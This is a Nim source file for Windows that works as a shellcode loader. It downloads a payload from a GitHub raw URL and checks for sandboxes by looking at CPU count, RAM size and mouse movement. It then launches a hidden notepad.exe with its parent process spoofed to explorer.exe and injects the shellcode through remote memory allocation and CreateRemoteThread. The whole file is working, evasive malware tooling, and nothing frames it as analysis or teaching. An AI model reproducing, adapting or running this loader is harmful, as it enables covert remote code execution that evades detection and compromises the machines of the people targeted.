import winim
import puppy
import strutils

# --- Helpers ---

func toByteSeq*(str: string): seq[byte] {.inline.} =
  @(str.toOpenArrayByte(0, str.high))

proc extractShellCodeWithHttp(): string =
    try:
        result = fetch("https://github.com/Claquetteuuuh/tp_nodejs_iut/blob/main/shellcode.txt?raw=true")
        return result
    except PuppyError as e:
        echo "Erreur HTTP: ", e.msg
        return ""

# --- Sandbox Evasion Checks ---

proc checkResources(): bool =
    # Check CPU Cores
    var sysInfo: SYSTEM_INFO
    GetSystemInfo(addr sysInfo)
    if sysInfo.dwNumberOfProcessors < 2:
        echo "[-] Sandbox detected: < 2 CPUs"
        return false

    # Check RAM
    var memStatus: MEMORYSTATUSEX
    memStatus.dwLength = cast[DWORD](sizeof(memStatus))
    GlobalMemoryStatusEx(addr memStatus)
    if cast[uint64](memStatus.ullTotalPhys) < 2147483648'u64:
        echo "[-] Sandbox detected: < 2GB RAM"
        return false
    
    return true

proc checkMouseMovement(): bool =
    var startPos: POINT
    GetCursorPos(addr startPos)
    
    let startTime = GetTickCount()
    
    while true:
        var currentPos: POINT
        GetCursorPos(addr currentPos)
        
        let dist = abs(currentPos.x - startPos.x) + abs(currentPos.y - startPos.y)
        
        if dist > 50: 
            return true
            
        if (GetTickCount() - startTime) > 20000:
            echo "[-] Sandbox detected: No mouse movement"
            return false
            
        Sleep(100)

# --- PPID Spoofing & Injection ---

proc getPidByName(processName: string): DWORD =
    var entry: PROCESSENTRY32
    entry.dwSize = cast[DWORD](sizeof(PROCESSENTRY32))
    let snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0)
    
    if Process32First(snapshot, addr entry):
        while Process32Next(snapshot, addr entry):
            # Winim's szExeFile is an array of WCHAR (utf-16) or CHAR depending on definition.
            # Usually in winim it's WCHAR if unicode is defined, but let's handle it safely.
            # We can use `nullTerminated` or manual loop.
            # Assuming default winim configuration (often unicode).
            var name = ""
            for c in entry.szExeFile:
                if c == 0: break
                name.add(char(c))
            
            if name.toLowerAscii() == processName.toLowerAscii():
                CloseHandle(snapshot)
                return entry.th32ProcessID
                
    CloseHandle(snapshot)
    return 0

proc createSpoofedProcess(cmdLine: string, parentPid: DWORD): PROCESS_INFORMATION =
    var si: STARTUPINFOEX
    var pi: PROCESS_INFORMATION
    var attributeSize: SIZE_T
    
    # Open handle to the parent process
    let hParent = OpenProcess(PROCESS_CREATE_PROCESS, FALSE, parentPid)
    if hParent == 0:
        echo "[-] Failed to open parent process"
        return pi # Empty PI

    # Initialize Attribute List
    InitializeProcThreadAttributeList(nil, 1, 0, addr attributeSize)
    si.lpAttributeList = cast[LPPROC_THREAD_ATTRIBUTE_LIST](HeapAlloc(GetProcessHeap(), 0, attributeSize))
    InitializeProcThreadAttributeList(si.lpAttributeList, 1, 0, addr attributeSize)
    
    # Update Attribute with Parent Process
    var hParentPtr = hParent
    # Explicit casting for UpdateProcThreadAttribute arguments to satisfy Winim/Nim types
    if UpdateProcThreadAttribute(si.lpAttributeList, 0, PROC_THREAD_ATTRIBUTE_PARENT_PROCESS, addr hParentPtr, cast[SIZE_T](sizeof(HANDLE)), nil, nil) == 0:
        echo "[-] Failed to update proc thread attribute"
        return pi

    si.StartupInfo.cb = cast[DWORD](sizeof(STARTUPINFOEX))
    
    # Create Process
    let success = CreateProcess(
        nil,
        newWideCString(cmdLine),
        nil,
        nil,
        FALSE,
        EXTENDED_STARTUPINFO_PRESENT or CREATE_NO_WINDOW, 
        nil,
        nil,
        addr si.StartupInfo,
        addr pi
    )
    
    if success == 0:
        echo "[-] CreateProcess failed: ", GetLastError()
    
    DeleteProcThreadAttributeList(si.lpAttributeList)
    HeapFree(GetProcessHeap(), 0, si.lpAttributeList)
    CloseHandle(hParent)
    
    return pi

proc injectShellcode(pi: PROCESS_INFORMATION, shellcode: seq[byte]) =
    if pi.hProcess == 0: return
    
    let size = shellcode.len
    
    # Allocate memory in remote process
    let remoteMem = VirtualAllocEx(
        pi.hProcess,
        nil,
        cast[SIZE_T](size),
        MEM_COMMIT or MEM_RESERVE,
        PAGE_READWRITE
    )
    
    if remoteMem == nil:
        echo "[-] VirtualAllocEx failed"
        return
        
    # Write shellcode
    var bytesWritten: SIZE_T
    if WriteProcessMemory(pi.hProcess, remoteMem, unsafeAddr shellcode[0], cast[SIZE_T](size), addr bytesWritten) == 0:
        echo "[-] WriteProcessMemory failed"
        return
        
    # Protect memory
    var oldProtect: DWORD
    if VirtualProtectEx(pi.hProcess, remoteMem, cast[SIZE_T](size), PAGE_EXECUTE_READ, addr oldProtect) == 0:
        echo "[-] VirtualProtectEx failed"
        return
        
    # Execute
    let hThread = CreateRemoteThread(
        pi.hProcess,
        nil,
        0,
        cast[LPTHREAD_START_ROUTINE](remoteMem),
        nil,
        0,
        nil
    )
    
    if hThread == 0:
        echo "[-] CreateRemoteThread failed"
        return
        
    echo "[+] Shellcode injected and thread created!"
    CloseHandle(hThread)

proc main()=
    echo "[*] Performing sandbox checks..."
    if not checkResources(): quit(0)
    echo "[*] Waiting for user interaction..."
    if not checkMouseMovement(): quit(0)
    echo "[+] Checks passed."

    echo "[*] Fetching shellcode..."
    let shellcodeStr = extractShellCodeWithHttp()
    if shellcodeStr.len == 0:
        echo "[-] Failed to fetch shellcode"
        return
    let shellcode = toByteSeq(shellcodeStr)
    
    echo "[*] Finding explorer.exe..."
    let parentPid = getPidByName("explorer.exe")
    if parentPid == 0:
        echo "[-] explorer.exe not found"
        return
    echo "[+] Found explorer.exe PID: ", parentPid
    
    echo "[*] Spawning spoofed notepad.exe..."
    let pi = createSpoofedProcess("notepad.exe", parentPid)
    if pi.hProcess == 0:
        return
        
    echo "[+] Process created. PID: ", pi.dwProcessId
    
    echo "[*] Injecting shellcode..."
    injectShellcode(pi, shellcode)
    
    # Cleanup handles
    CloseHandle(pi.hProcess)
    CloseHandle(pi.hThread)

main()